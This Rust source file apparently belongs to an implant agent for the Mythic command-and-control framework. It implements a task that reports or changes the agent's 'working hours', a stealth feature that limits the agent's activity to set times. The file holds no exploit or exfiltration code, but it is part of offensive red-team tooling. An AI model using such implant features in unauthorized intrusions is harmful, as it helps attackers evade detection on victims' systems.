use crate::agent::{AgentTask, SharedData};
use crate::mythic_success;
use chrono::NaiveTime;
use serde::Deserialize;
use std::error::Error;
use std::result::Result;

/// Struct holding the working hours parameters
#[derive(Debug, Deserialize)]
struct WorkinghoursArgs {
    start: Option<String>,
    end: Option<String>,
    get: Option<bool>,
}

/// Change the agent's configured working hours
/// * `task` - Task information
/// * `agent` - Agent shared data
pub fn working_hours(
    task: &AgentTask,
    agent: &mut SharedData,
) -> Result<serde_json::Value, Box<dyn Error>> {
    // Parse the task parameters
    let args: WorkinghoursArgs = serde_json::from_str(&task.parameters)?;

    // Check if the task wants to get the currently configured working hours
    let user_output = if let Some(get) = args.get {
        if get {
            // Get the currently configured start working hours
            let start = agent.working_start.format("%H:%M").to_string();

            // Get the currently configured end working hours
            let end = agent.working_end.format("%H:%M").to_string();

            // Create the output for Mythic
            format!("Working hours are set to {}-{}", start, end)
        } else {
            return Err("Failed to parse arguments".into());
        }

        // Check if the task wants to set the working hours
    } else if let (Some(start), Some(end)) = (args.start, args.end) {
        // Parse the start and end working hours from the task parameters
        let start = NaiveTime::parse_from_str(&start, "%H:%M")?;
        let end = NaiveTime::parse_from_str(&end, "%H:%M")?;

        // Set the new start working hours
        agent.working_start = start;

        // Set the new end working hours
        agent.working_end = end;

        // Create the output for Mythic
        format!("Changed working hours to {}-{}", start, end)
    } else {
        return Err("Failed to parse arguments".into());
    };

    // Return the output
    Ok(mythic_success!(task.id, user_output))
}
